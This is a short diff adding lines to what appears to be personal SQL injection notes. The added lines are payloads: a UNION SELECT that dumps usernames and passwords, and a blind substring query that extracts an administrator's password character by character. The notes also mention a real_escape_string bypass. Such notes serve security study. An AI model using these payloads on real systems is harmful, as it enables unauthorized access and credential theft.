@@ -113,3 +113,11 @@ ways to byass real_escape_string function
       2. double encoding
 
 
+Retrieving multiple values within a single column
+' UNION SELECT NULL,username || '~' || password FROM users--
+
+
+Blind SQL Injection
+1. Conditional Responses using substring
+
+'union SELECT substring((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)>a FROM users --
